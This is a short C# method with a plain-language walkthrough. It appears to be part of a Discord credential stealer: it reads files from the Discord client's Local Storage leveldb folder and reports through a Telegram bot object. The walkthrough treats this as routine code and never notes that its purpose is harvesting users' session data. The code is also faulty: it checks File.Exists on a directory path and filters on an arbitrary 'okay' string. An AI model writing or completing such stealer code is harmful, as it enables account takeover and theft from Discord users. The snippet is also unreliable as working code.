```
private static List<string> SearchForFile()
{
    List<string> ldbFiles = new List<string>();

    // LDB file used to locate Discord client.
    string discordLdbFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Discord", "Local Storage", "leveldb");

    if (!File.Exists(discordLdbFile))
    {
        telegram.sendText("⛔ Didn't find any ldb files");
        return ldbFiles;
    }

    string[] files = Directory.GetFiles(Path.GetDirectoryName(discordLdbFile), "*.ldb");

    foreach (string file in files)
    {
        string fileContent = File.ReadAllText(file);
        if (fileContent.Contains("okay"))
        {
            ldbFiles.Add(fileContent);
        }
    }

    return ldbFiles;
}
```
This code first locates the Discord client's LDB file using the `Environment.SpecialFolder.LocalApplicationData` and `Path.Combine` methods. It then checks if the file exists using the `File.Exists` method. If the file does not exist, it sends a message notification through Telegram using the `telegram.sendText` method.

If the file exists, it reads all the files in the directory using the `Directory.GetFiles` method and checks if each file's content contains the "okay" string using the `File.ReadAllText` method. If a file's content contains the "okay" string, it is added to the `ldbFiles` list using the `ldbFiles.Add` method.

Finally, the `ldbFiles` list is returned.

